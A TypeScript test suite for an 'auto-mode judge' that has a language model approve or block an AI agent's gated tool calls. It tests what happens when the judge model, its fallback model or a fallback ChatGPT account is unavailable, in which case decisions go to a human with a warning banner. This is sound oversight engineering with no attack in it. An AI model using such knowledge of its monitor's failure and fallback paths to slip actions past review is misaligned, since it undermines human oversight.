      expect((await judge.judge(bash, call)).kind).toBe('human')
      expect(asked).toHaveLength(1)
      expect(errors(emit)).toEqual([expect.stringContaining("Auto-mode can't judge here:")])
    }
  })

  it('a fallback model the catalog no longer lists is no fallback: the human decides, one log line', async () => {
    const { asked, makeTransport } = scripted({}, { [PRIMARY]: DOWN })
    const { judge, call, emit } = setup(
      { twoStageMode: 'fast', fallbackJudgeModel: 'x/gone' },
      { peekModels: () => groups(PRIMARY, FALLBACK), makeTransport }
    )

    expect((await judge.judge(bash, call)).kind).toBe('human')
    expect((await judge.judge({ ...bash, toolUseId: 'oc-call-8' }, call)).kind).toBe('human')

    expect(asked).toEqual([PRIMARY, PRIMARY])
    expect(errors(emit)).toEqual([expect.stringContaining(`Auto-mode can't judge here: ${DOWN}`)])
    expect(
      mockLogger.warn.mock.calls.filter(([, msg]) => String(msg).includes('fallback judge'))
    ).toHaveLength(1)
  })

  it('a stale PRIMARY model is judged by the fallback, and the banner says so', async () => {
    const { asked, makeTransport } = scripted({ [FALLBACK]: ['<block>no</block>'] })
    const { judge, call, emit } = setup(
      { twoStageMode: 'fast', judgeModel: 'x/gone', fallbackJudgeModel: FALLBACK },
      { peekModels: () => groups('x/other', FALLBACK), makeTransport }
    )

    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })

    expect(asked).toEqual([FALLBACK])
    expect(errors(emit)).toEqual([
      'Auto-mode judge model "x/gone" is no longer available — x/fallback is judging instead. ' +
        'Change the judge models in Settings › Sessions & autonomy › Auto-mode judge (opencode).'
    ])
  })

  describe('a report review', () => {
    it('is judged by the fallback when the primary cannot answer, with no banner on the target', async () => {
      const { asked, makeTransport } = scripted(
        { [FALLBACK]: ['<block>no</block>'] },
        { [PRIMARY]: DOWN }
      )
      const { judge, call, emit } = setup(
        { twoStageMode: 'fast', fallbackJudgeModel: FALLBACK },
        { makeTransport }
      )

      expect(await judge.reviewHandBack('Done.', call)).toEqual({ kind: 'allow' })
      expect(asked).toEqual([PRIMARY, FALLBACK])
      expect(emit).not.toHaveBeenCalled()
    })

    it('names both judges when neither could answer', async () => {
      const { makeTransport } = scripted({}, { [PRIMARY]: DOWN, [FALLBACK]: FALLBACK_DOWN })
      const { judge, call, emit } = setup(
        { twoStageMode: 'fast', fallbackJudgeModel: FALLBACK },
        { makeTransport }
      )

      expect(await judge.reviewHandBack('Done.', call)).toEqual({
        kind: 'unavailable',
        why: `${DOWN} Fallback ${FALLBACK}: ${FALLBACK_DOWN}`
      })
      expect(emit).not.toHaveBeenCalled()
    })
  })
})

describe('DispatchTargetJudge fallback on another ChatGPT account (autoMode.fallbackJudgeAccount)', () => {
  const DOWN = 'ChatGPT · gpt-6-luna: HTTP 429 (resets at 2026-10-28T13:34:58.000Z).'
  const label = 'x/luna (Business account)'

  beforeEach(() => {
    chatgptVault.activeId = 'acct-plus'
    chatgptVault.accounts = [
      { id: 'acct-plus', planType: 'plus' },
      { id: 'acct-biz', planType: 'business' }
    ]
    resetChatgptAccounts()
  })

  /** Transports shaped like the real one, scripted by the account they were told to pay with. */
  function byAccount(replies: Record<string, string[]>, reasons: Record<string, string> = {}) {
    const built: SessionJudgeOptions[] = []
    const asked: Array<{ model: string; account: string | undefined }> = []
    const makeTransport = (opts: SessionJudgeOptions) => {
      built.push(opts)
      return async () => {
        const account = opts.chatgptAccountId?.()
        const key = account ?? '(active)'
        asked.push({ model: opts.modelValue(), account })
        const next = replies[key]?.shift()
        if (next === undefined) {
          opts.onUnavailable(reasons[key] ?? `${key}: down.`)
          throw new Error(`${key} down`)
        }
        return next
      }
    }
    return { built, asked, makeTransport }
  }

  const errors = (emit: ReturnType<typeof vi.fn>): string[] =>
    emit.mock.calls.filter((c) => c[0] === 'session:error').map((c) => c[1] as string)

  it('the same model on a different account is a fallback: its transport names that account', async () => {
    const { built, asked, makeTransport } = byAccount(
      { 'acct-biz': ['<block>no</block>'] },
      { '(active)': DOWN }
    )
    const { judge, call, emit } = setup(
      {
        twoStageMode: 'fast',
        judgeModel: 'x/luna',
        fallbackJudgeModel: 'x/luna',
        fallbackJudgeAccount: ' acct-biz '
      },
      { makeTransport }
    )

    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })

    // The primary names no account (the active one pays); the fallback names the vault account.
    expect(asked).toEqual([
      { model: 'x/luna', account: undefined },
      { model: 'x/luna', account: 'acct-biz' }
    ])
    expect(built[0].chatgptAccountId).toBeUndefined()
    expect(errors(emit)).toEqual([
      `Auto-mode judge unavailable: ${DOWN} ${label} is judging instead until it recovers. ` +
        'Change the judge models in Settings › Sessions & autonomy › Auto-mode judge (opencode).'
    ])
  })

  it('the same model on the ACTIVE account is no fallback', async () => {
    const { asked, makeTransport } = byAccount({}, { '(active)': DOWN })
    const { judge, call, emit } = setup(
      {
        twoStageMode: 'fast',
        judgeModel: 'x/luna',
        fallbackJudgeModel: 'x/luna',
        fallbackJudgeAccount: 'acct-plus'
      },
      { makeTransport }
    )

    expect((await judge.judge(bash, call)).kind).toBe('human')
    expect(asked).toEqual([{ model: 'x/luna', account: undefined }])
    expect(errors(emit)).toEqual([expect.stringContaining("Auto-mode can't judge here:")])
  })

  it('when the named account cannot answer either, the one fallback banner names its plan', async () => {
    const { makeTransport } = byAccount(
      {},
      { '(active)': DOWN, 'acct-biz': 'The fallback ChatGPT account is not signed in.' }
    )
    const { judge, call, emit } = setup(
      {
        twoStageMode: 'fast',
        judgeModel: 'x/luna',
        fallbackJudgeModel: 'x/luna',
        fallbackJudgeAccount: 'acct-biz'
      },
      { makeTransport }
    )

    expect((await judge.judge(bash, call)).kind).toBe('human')
    expect(errors(emit)).toEqual([
      expect.stringContaining(`${label} is judging instead`),
      `Auto-mode can't judge here: fallback ${label}: The fallback ChatGPT account is not signed in. ` +
        'Every gated action will ask you instead. ' +
        'Change the judge model in Settings › Sessions & autonomy › Auto-mode judge (opencode).'
    ])
  })

  it('a report review names the fallback by its label when neither judge could answer', async () => {
    const { makeTransport } = byAccount({}, { '(active)': DOWN, 'acct-biz': 'No account.' })
    const { judge, call, emit } = setup(
      {
        twoStageMode: 'fast',
        judgeModel: 'x/luna',
        fallbackJudgeModel: 'x/luna',
        fallbackJudgeAccount: 'acct-biz'
      },
      { makeTransport }
    )

    expect(await judge.reviewHandBack('Done.', call)).toEqual({
      kind: 'unavailable',
      why: `${DOWN} Fallback ${label}: No account.`
    })
    expect(emit).not.toHaveBeenCalled()
  })

  it('no account named: the fallback transport names none (the active account, as before)', async () => {
    const built: SessionJudgeOptions[] = []
    const makeTransport = (opts: SessionJudgeOptions) => {
      built.push(opts)
      return async () => {
        if (opts.modelValue() === 'x/luna') {
          opts.onUnavailable(DOWN)
          throw new Error('down')
        }
        return '<block>no</block>'
      }
    }
    const { judge, call } = setup(
      { twoStageMode: 'fast', judgeModel: 'x/luna', fallbackJudgeModel: 'x/other' },
      { makeTransport }
    )

    expect(await judge.judge(bash, call)).toEqual({ kind: 'allow' })
    expect(built[1].modelValue()).toBe('x/other')
    expect(built[1].chatgptAccountId?.()).toBeUndefined()
  })
})
